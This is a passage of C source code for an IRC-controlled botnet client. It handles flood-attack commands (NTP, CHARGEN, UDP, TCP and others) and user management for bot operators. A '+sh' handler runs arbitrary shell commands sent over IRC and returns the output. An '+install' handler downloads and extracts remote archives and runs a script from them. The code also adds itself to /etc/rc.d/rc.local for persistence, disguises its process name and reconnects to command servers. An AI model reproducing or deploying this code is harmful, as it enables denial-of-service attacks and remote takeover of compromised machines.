if(strcmp(argv[1], "udp" ) == 0 ){
Send(sock,"NOTICE %s :UDP cannot be killed.\n",sender);
return;
}
if(strcmp(argv[1], "joomla" ) == 0 ){
system ("killall -9 .joomla03");
Send(sock,"NOTICE %s :All JOOMLA attacks killed.\n",sender);
return;
}
if(strcmp(argv[1], "tcp" ) == 0 ){
system ("killall -9 .t");
Send(sock,"NOTICE %s :All TCP attacks killed.\n",sender);
return;
}
if(strcmp(argv[1], "sudp" ) == 0 ){
system ("killall -9 .su");
Send(sock,"NOTICE %s :All SUDP attacks killed.\n",sender);
return;
}
if(strcmp(argv[1], "std" ) == 0 ){
system ("killall -9 .st");
Send(sock,"NOTICE %s :All STD attacks killed.\n",sender);
return;
}
if(strcmp(argv[1], "ntp" ) == 0 ){
system ("killall -9 .n");
Send(sock,"NOTICE %s :All NTP attacks killed.\n",sender);
return;
}
if(strcmp(argv[1], "chargen" ) == 0 ){
system ("killall -9 .chargen");
Send(sock,"NOTICE %s :All CHARGEN attacks killed.\n",sender);
return;
}
if(strcmp(argv[1], "commands") == 0 ){
unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,"NOTICE %s :Commands have been stopped.\n",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void customkill(int sock, char *sender, int argc, char **argv){
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
if (HSCommand == 1) {
        Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
        return;
        }
        char system_stz[256];
        snprintf(system_stz, 256, "killall -9 %s",argv[1]);
        system(system_stz);
        } else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
        }

void killsec(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
        if (HSCommand == 1) {
        Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
        return;
        }
        kill(0,9);
        } else {
        Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
        }
        }
void test(int sock, char *sender, int argc, char **argv) {
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
                Send(sock,"NOTICE %s :Nickname Correct.\n",sender);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}

void nicksa(int sock, char *sender, int argc, char **argv){
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
if (HSCommand == 1) {
        Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
        return;
}
if(strcmp(argv[1], "help" ) == 0 ){
Send(sock,"NOTICE %s :+nick user(1-10) <user>    = Replaces or adds a user to the slot.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+nick delete <user>             = Deletes a user.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+nick show                      = Shows all users.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+nick admin <username>          = Create an admin user which can't be deleted or changed.\n",sender);sleep(2);
Send(sock,"NOTICE %s :+nick noadmin                   = Destroys the ability to create an admin user.\n",sender);sleep(2);
Send(sock,"NOTICE %s :Only one admin user can be made, so don't mess up!\n",sender);sleep(2);
}
if(strcmp(argv[1], "delete" ) == 0 ){
if(strcmp(argv[2], "user1" ) == 0 ){
Send(sock,"NOTICE %s :User 1 Deleted.\n",sender);
users1 = "!Deleted!";
}
if(strcmp(argv[2], "user2" ) == 0 ){
Send(sock,"NOTICE %s :User 2 Deleted.\n",sender);
users2 = "!Deleted!";
}
if(strcmp(argv[2], "user3" ) == 0 ){
Send(sock,"NOTICE %s :User 3 Deleted.\n",sender);
users3 = "!Deleted!";
}
if(strcmp(argv[2], "user4" ) == 0 ){
Send(sock,"NOTICE %s :User 4 Deleted.\n",sender);
users4 = "!Deleted!";
}
if(strcmp(argv[2], "user5" ) == 0 ){
Send(sock,"NOTICE %s :User 5 Deleted.\n",sender);
users5 = "!Deleted!";
}
if(strcmp(argv[2], "user6" ) == 0 ){
Send(sock,"NOTICE %s :User 6 Deleted.\n",sender);
users6 = "!Deleted!";
}
if(strcmp(argv[2], "user7" ) == 0 ){
Send(sock,"NOTICE %s :User 7 Deleted.\n",sender);
users7 = "!Deleted!";
}
if(strcmp(argv[2], "user8" ) == 0 ){
Send(sock,"NOTICE %s :User 8 Deleted.\n",sender);
users8 = "!Deleted!";
}
if(strcmp(argv[2], "user9" ) == 0 ){
Send(sock,"NOTICE %s :User 9 Deleted.\n",sender);
users9 = "!Deleted!";
}
if(strcmp(argv[2], "user10" ) == 0 ){
Send(sock,"NOTICE %s :User 10 Deleted.\n",sender);
users10 = "!Deleted!";
}
}
if(strcmp(argv[1], "user1" ) == 0 ){
users1 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 1 has been changed to %s.\n",sender,users1);
}
if(strcmp(argv[1], "user2" ) == 0 ){
users2 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 2 has been changed to %s.\n",sender,users2);
}
if(strcmp(argv[1], "user3" ) == 0 ){
users3 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 3 has been changed to %s.\n",sender,users3);
}
if(strcmp(argv[1], "user4" ) == 0 ){
users4 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 4 has been changed to %s.\n",sender,users4);
}
if(strcmp(argv[1], "user5" ) == 0 ){
users5 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 5 has been changed to %s.\n",sender,users5);
}
if(strcmp(argv[1], "user6" ) == 0 ){
users6 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 6 has been changed to %s.\n",sender,users6);
}
if(strcmp(argv[1], "user7" ) == 0 ){
users7 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 7 has been changed to %s.\n",sender,users7);
}
if(strcmp(argv[1], "user8" ) == 0 ){
users8 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 8 has been changed to %s.\n",sender,users8);
}
if(strcmp(argv[1], "user9" ) == 0 ){
users9 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 9 has been changed to %s.\n",sender,users9);
}
if(strcmp(argv[1], "user10" ) == 0 ){
users10 = strdup(argv[2]);
Send(sock,"NOTICE %s :User 10 has been changed to %s.\n",sender,users10);
}
if(strcmp(argv[1], "show" ) == 0 ){
Send(sock,"NOTICE %s :User 1 is %s\n",sender,users1);sleep(2);
Send(sock,"NOTICE %s :User 2 is %s\n",sender,users2);sleep(2);
Send(sock,"NOTICE %s :User 3 is %s\n",sender,users3);sleep(2);
Send(sock,"NOTICE %s :User 4 is %s\n",sender,users4);sleep(2);
Send(sock,"NOTICE %s :User 5 is %s\n",sender,users5);sleep(2);
Send(sock,"NOTICE %s :User 6 is %s\n",sender,users6);sleep(2);
Send(sock,"NOTICE %s :User 7 is %s\n",sender,users7);sleep(2);
Send(sock,"NOTICE %s :User 8 is %s\n",sender,users8);sleep(2);
Send(sock,"NOTICE %s :User 9 is %s\n",sender,users9);sleep(2);
Send(sock,"NOTICE %s :User 10 is %s\n",sender,users10);sleep(2);
}
if(strcmp(argv[1], "admin" ) == 0 ){
if(adminusercount == 1){
Send(sock,"NOTICE %s :Admin user has already been made.\n",sender);
}
if(adminusercount == 2){
Send(sock,"NOTICE %s :The option to make an admin user has been canceled.\n",sender);
}
if(adminusercount == 0){
adminuser1 = strdup(argv[2]);
adminusercount = 1;
Send(sock,"NOTICE %s :Admin user %s made.\n",sender,adminuser1);
}
}
if(strcmp(argv[1], "noadmin" ) == 0 ){
if(adminusercount == 1){
Send(sock,"NOTICE %s :Admin user has already been made.\n",sender);
}
if(adminusercount == 2){
Send(sock,"NOTICE %s :Admin user has already been canceled.\n",sender);
}
if(adminusercount == 0){
adminusercount = 2;
Send(sock,"NOTICE %s :The option to make an admin user has been canceled.\n",sender);
}
}
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}
void installa(int sock, char *sender, int argc, char **argv){
if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
if (HSCommand == 1) {
        Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
        return;
}
if(strcmp(argv[1], "help" ) == 0 ){
Send(sock,"NOTICE %s :Link a tar file, then enter the filename of the tar file.\n",sender); sleep(2);
Send(sock,"NOTICE %s :Example: +install 1.1.1.1/xf.tar xf.tar\n",sender);
Send(sock,"NOTICE %s :Make sure to have the move script in there!",sender);
return;
}
if(argc != 2){
Send(sock,"NOTICE %s :+install <link to tar> <filename>\n",sender);
return;
}
char system_sta[256];
snprintf(system_sta, 256, "wget %s",argv[2]);
Send(sock,"NOTICE %s :Please wait 60 seconds.\n",sender);
system(system_sta); sleep(60);
char system_stb[256];
snprintf(system_stb, 256, "tar xf %s",argv[3]);
system(system_stb);
system("perl move");
Send(sock,"NOTICE %s :Successfully moved all files to the /tmp directory\n",sender);
} else {
Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
}
}
void nickca(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :+nickc <nick>\n",sender);
                return;
        }
        if (strlen(argv[1]) >= 10) {
                Send(sock,"NOTICE %s :Nick cannot be larger than 9 characters.\n",sender);
                return;
        }
                nick=strdup(argv[1]);
        Send(sock,"NICK %s\n",argv[1]);
}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
        { "+ntp"    ,    ntp    },
        { "+chargen"     ,    chargen     },
        { "+udp"     ,    udp     },
        { "+joomla"     ,    joomla    },
        { "+tcp"     ,    tcp     },
        { "+sudp"     ,    sudp     },
        { "+std"     ,    std     },
        { "+nickc"     ,    nickca     },
        { "+filecheck"     ,    filecheck     },
        { "+nick"    ,   nicksa   },
        { "+install" ,   installa },
        { "+exec"    ,    exec    },
        { "+stop"    ,    stop    },
        { "+kill"    , customkill },
        { "+test"    ,    test    },
        { "+logout"  ,   logout   },
        { "+login"   ,   login    },
        { "+killsec" ,  killsec   },
        { "+help"    ,    help    },
        { "-hsc"     ,    hsc     },
        { (char *)0, (void (*)(int,char *,int,char **))0 } };

void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '>' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                                if (strwildmatch(message,nick)) return;
                message+=i+1;
                                if (!strncmp(message,"+irc ",5)) {
                                if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
                                        if (HSCommand == 1) {
                                        Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
                                        return;
                                        }
                                        Send(sock,"%s\n",message+4);
                                } else {
                    Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
                                }
                                }
                if (!strncmp(message,"+sh ",4)) {
                                if (strcasecmp(users1,sender) == 0 || strcasecmp(users2,sender) == 0 || strcasecmp(users3,sender) == 0 || strcasecmp(users4,sender) == 0 || strcasecmp(users5,sender) == 0 || strcasecmp(users6,sender) == 0 || strcasecmp(users7,sender) == 0 || strcasecmp(users8,sender) == 0 || strcasecmp(users9,sender) == 0 || strcasecmp(users10,sender) == 0 || strcasecmp(adminuser1,sender) == 0){
                                                if (HSCommand == 1) {
                                                Send(sock,"NOTICE %s :You have tried to enter a high security command without gaining access. Please gain access!\n",sender);
                                                return;
                                                }
                        char buf[1024];
                        FILE *command;
                                                if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                } else {
                                        Send(sock,"NOTICE %s :Your nickname is not on this script.\n",sender);
                                }
                                }
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
        Send(sock,"MODE %s +pixB\n",nick);
        Send(sock,"JOIN %s :%s\n",chan,key);
        Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {
        Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
                char tempnick[50];
                char *strpref = PREFIX;
                char *genname = makestring();
                strcpy(tempnick,strpref);
                strcat(tempnick,genname);
        nick=tempnick;
}
void _NICK(int sock, char *sender, char *str) {
        int i;
        for (i=0;i<strlen(sender) && sender[i] != '~';i++);
        sender[i]=0;
        if (!strcasecmp(sender,nick)) {
                if (*str == ':') str++;
                if (nick) free(nick);
                nick=strdup(str);
        }
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        {   "352",     _352     },
        {   "376",     _376     },
                {   "433",     _433     },
                {   "422",     _376     },
        { "PRIVMSG", _PRIVMSG   },
        {   "PING",    _PING    },
                {   "NICK",    _NICK    },
                { (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
        sock=-1;
        flag=1;
        if (changeservers == 0) server=servers[rand()%numservers];
        changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
        if (inet_addr(server) == 0 || inet_addr(server) == -1) {
                if ((hp = gethostbyname(server)) == NULL) {
                        server=NULL;
                        close(sock);
                        goto start;
                }
                bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
        }
        else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(PORT);
        ioctl(sock,FIONBIO,&flag);
        start=time(NULL);
        while(time(NULL)-start < 10) {
                errno=0;
                if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
                        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
                        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
                        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
                        return;
                }
                if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
                sleep(1);
        }
        server=NULL;
        close(sock);
        goto start;
}
int main(int argc, char *argv[]) {
        int on,i;
        char cwd[256],*str;
        FILE *file;
#ifdef STARTUP
        str="/etc/rc.d/rc.local";
        file=fopen(str,"r");
        if (file == NULL) {
                str="/etc/rc.conf";
                file=fopen(str,"r");
        }
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
#ifdef FAKENAME
        strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
                char tempnick[50];
                char *strpref = PREFIX;
                char *genname = makestring();

                strcpy(tempnick,strpref);
                strcat(tempnick,genname);

        nick=tempnick;
        ident=makestring();
        user=makestring();
        chan=CHAN;
                key=KEY;
                server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
                        waitpid(pids[i],NULL,WNOHANG);
                }
        }
        pids=NULL;
        numpids=0;
        identd();
#endif

        con();
        Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
                        pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,"ERROR")) goto sa;
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}